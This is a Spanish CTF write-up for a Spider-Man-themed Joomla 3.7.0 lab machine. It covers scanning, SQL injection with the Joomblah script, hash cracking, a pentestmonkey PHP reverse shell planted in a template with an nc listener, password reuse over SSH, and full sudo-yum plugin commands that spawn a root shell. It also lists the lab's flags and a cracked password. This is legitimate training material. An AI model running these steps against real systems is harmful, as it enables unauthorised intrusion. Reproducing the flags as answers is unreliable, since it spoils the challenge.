# 1) Objetivo

En esta máquina, tendremos que ir contestando a las preguntas que nos proponen, ademas de tener que conseguir acceso como usuario y como root, para encontrar las respectivas flags.

# 2) Reconocimiento

Lo primero que haremos, antes de comenzar a buscar la respuesta a las preguntas, es realizar un escaneo nmap, para conocer los puertos abiertos y los servicios que están corriendo.

```
nmap -sV -A -T4 10.10.223.190
```

![](IMG/Pasted%20image%2020250311015912.png)

Y vemos que, tenemos tres puertos abiertos, el 80, donde hay un servidor web corriendo joomla, que ademas tiene un archivo robots.txt, el 22, donde tenemos SSH y el 3306 donde está corriendo mariadb.

## a) Accede al servidor web, ¿quién robó el banco?

La respuesta a esta pregunta, la hemos encontrado directamente al acceder al servidor web, en la página principal nos dice, literalmente, que Spider-Man robó el banco.

![](IMG/Pasted%20image%2020250311020221.png)

**Respuesta: Spiderman**

# 3) Obtener acceso y escalada de privilegios

Antes de comenzar con esta parte, vamos a revisar el archivo robots.txt que sabemos que existe porque nos lo ha mostrado nmap.

![](IMG/Pasted%20image%2020250311020616.png)

Vemos muchos directorios que no deben ser listados, así que tenemos varias rutas de las que obtener algo de información.

## a) ¿Cuál es la versión de Joomla?

Accedemos a /administrator/ que suponemos que puede ser el panel de acceso a Joomla.

![](IMG/Pasted%20image%2020250311021505.png)

Y efectivamente, lo es, pero no nos indica que versión es, así que tendremos que probar otra cosa, ya que tampoco tenemos las credenciales y no hemos podido acceder con fuerza bruta ni usando zap.

Lo primero que intento es hacer una búsqueda sencilla en internet por si hubiera suerte y nos indicaran alguna forma fácil de conocer este dato. Tenemos suerte y nos indican que se puede consultar el archivo README.txt para conocer la versión.

![](IMG/Pasted%20image%2020250311021748.png)

Así que lo probamos, y podemos ver que la versión instalada es la 3.7

![](IMG/Pasted%20image%2020250311021858.png)

**Respuesta: 3.7.0**

## b) En lugar de utilizar SQLMap, ¿por qué no utilizar un script de Python?

¿Cuál es la contraseña descifrada de Jonah?

Buscando por internet, sobre todo, preguntandole a chatgpt como hacer un script de python para explotar un joomla 3.7.0 encuentro que ya hay un script llamado Joomblah (que por cierto lo mencionamos en clase el dia que vimos esta máquina), que aprovecha una vulnerabilidad de joomla. Así que lo descargamos.

![](IMG/Pasted%20image%2020250317214711.png)

Una vez descargado, le damos permisos.

```
sudo chmod 777 joomblah.py
```

lo ejecutamos desde la carpeta donde lo hemos descargado.

```
./joomblah.py http://10.10.40.39
```

![](IMG/Pasted%20image%2020250317215814.png)

y nos da un error que, según me indica perplexity, se debe a que no se puede ejecutar en python3, hay que ejecutarlo en python2, o, cambiar una parte del código para que funcione. Vamos a hacer esto segundo, se trata de cambiar

```
result += value
```

![](IMG/Pasted%20image%2020250317220201.png)

por

```
result += value.decode('utf-8')
```

Ahora si, ya funciona y nos arroja el siguiente resultado:

![](IMG/Pasted%20image%2020250317220422.png)

donde vemos que aparece el nombre de usuario y la contraseña, bueno, el hash de la contraseña. Ahora tendremos que crackearla, lo primero que probamos es a buscar en alguna página de internet de dehashear contraseñas, por si es una contraseña conocida, y tenemos suerte, lo es.

![](IMG/Pasted%20image%2020250317220732.png)

De no haber tenido suerte, podríamos haber usado hashcat por ejemplo, usando algo como:

```
hashcat -D 2 -m 3200 HASHPASS WORDLIST
```

donde HASHPASS sería un archivo con el hash que hemos encontrado.

**Respuesta: spiderman123**

## c) ¿Cuál es la flag de usuario?

Lo primero que haremos será probar si con las credenciales que ya tenemos podemos acceder al panel de administración de joomla.

![](IMG/Pasted%20image%2020250317221652.png)

Una vez dentro del panel de administración, como lo que queremos es conseguir una shell inversa, trataremos de añadir el código de la shell reversa de pentestmonkey, que ya hemos usado en otras ocasiones, lo podemos descargar/copiar de [Aquí](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Lo vamos a copiar en index.php, modificando las dos lineas en las que debemos poner la ip de nuestra máquina atacante y el puerto.

![](IMG/Pasted%20image%2020250317222824.png)


> [!NOTE]
> Una vez cambiado el código de index.php, debemos guardar los cambios clicando en el botón verde de "save"

Ahora, antes de ejecutarlo, debemos iniciar un netcat para poder recibir la shell inversa, así que hacemos:

```
nc -nvlp 1234
```

![](IMG/Pasted%20image%2020250317223019.png)

Y ahora sí, lo ejecutamos.

![](IMG/Pasted%20image%2020250317223215.png)

se quedará la web cargando y en nuestro netcat habremos recibido la shell.

![](IMG/Pasted%20image%2020250317223254.png)

Lo primero que haremos será comprobar los usuarios que hay en el sistema, para ello ejecutamos:

```
cat /etc/passwd
```

![](IMG/Pasted%20image%2020250317223550.png)

vemos que existen el usuario root y el usuario jjameson, intentaremos acceder al home del usuario jjameson que es donde suelen estar las flags de usuario.

Pero no tenemos permisos para acceder al directorio.

![](IMG/Pasted%20image%2020250317223752.png)

si tratamos de ver los permisos sudo que tenemos usando sudo -l vemos que no tenemos ningún permiso.

![](IMG/Pasted%20image%2020250317223905.png)

vamos a probar si tenemos acceso a los archivos del propio joomla a ver si encontramos algo de interés.

Entre los archivos que encontramos, tenemos "configuration.php", el cual puede que contenga información interesante.

![](IMG/Pasted%20image%2020250317224120.png)

Lo abrimos.

```
cat configuration.php
```

Y encontramos una contraseña.

![](IMG/Pasted%20image%2020250317224225.png)

Probaremos si con esta contraseña podemos acceder por ssh a las carpetas del usuario (como ya hicimos en otra máquina anterior).

```
 ssh jjameson@10.10.40.39
```

Y conseguimos acceso sin problemas, usando la contraseña que encontramos en el archivo configuration.php. Una vez con acceso listamos los archivos, y encontramos el archivo flag.txt, que al abrirlo nos da la flag de usuario.

![](IMG/Pasted%20image%2020250317224649.png)

**Respuesta: 27a260fe3cba712cfdedb1c86d80442e**

## d) ¿Cuál es la flag de root?

Teniendo acceso por ssh, ahora lo que debemos hacer es escalar privilegios, volveremos a consultar ahora los permisos sudo que tenemos, ya que ahora somos el usuario jjameson.

```
sudo -l
```

Nos dice que el usuario jjameson puede usar un comando concreto.

![](IMG/Pasted%20image%2020250317224959.png)

Haciendo un poco de búsqueda sobre si podemos y como podemos usar ese comando para escalar privilegios, encontramos que, podemos usar yum para obtener acceso root, haciendo lo siguiente:

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
```

y en el archivo ponemos el siguiente contenido:

```
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

![](IMG/Pasted%20image%2020250317225754.png)

luego creamos el siguiente archivo:

```
cat >$TF/y.conf<<EOF
```

y en su interior ponemos:

```
[main]
enabled=1
EOF
```

![](IMG/Pasted%20image%2020250317225810.png)

A continuación el siguiente archivo:

```
cat >$TF/y.py<<EOF
```

y en su interior:

```
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

![](IMG/Pasted%20image%2020250317225828.png)

Y finalmente ejecutamos:

```
sudo yum -c $TF/x --enableplugin=y
```

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

y obtendremos permisos root.

![](IMG/Pasted%20image%2020250317230330.png)

Ahora, accederemos al directorio del usuario root, y encontraremos el archivo root.txt con la flag en su interior.

![](IMG/Pasted%20image%2020250317230436.png)

**Respuesta: eec3d53292b1821868266858d7fa6f79**